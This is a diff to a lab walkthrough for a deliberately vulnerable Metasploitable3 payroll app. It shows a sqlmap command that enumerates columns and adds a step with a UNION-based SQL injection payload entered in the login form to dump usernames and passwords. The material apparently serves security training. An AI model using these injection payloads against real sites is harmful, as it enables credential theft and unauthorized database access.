@@ -53,6 +53,19 @@ RESULTS: SQLMap will identify whether the web application is vulnerable to SQL I
    sqlmap -u http://127.0.0.1:7000/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST --columns
    ```
 
-RESULTS: SQLMap will identify whether the web application is vulnerable to SQL Injection
+RESULTS: SQLMap will retrieve the columns on the application tables
    ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-5-1.png "STEP 5")
    ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-5-2.png "RESULT 5")   
+
+6. <b>Use the fields retrieved to retrieve the user passwords:</b>
+
+   | Field     | Value                                       |
+   | --------- |:-------------------------------------------:|
+   | USERNAME  | ' or 1 union select 1,username,password,1;#'|
+   | PASSWORD  | admin                                       |  
+
+RESULTS: The web page will return the user credentials
+   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-6.png "STEP 5")
+   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-6-1.png "RESULT 6")
+   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-6-2.png "RESULT 6")  
+   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-6-3.png "RESULT 6")   
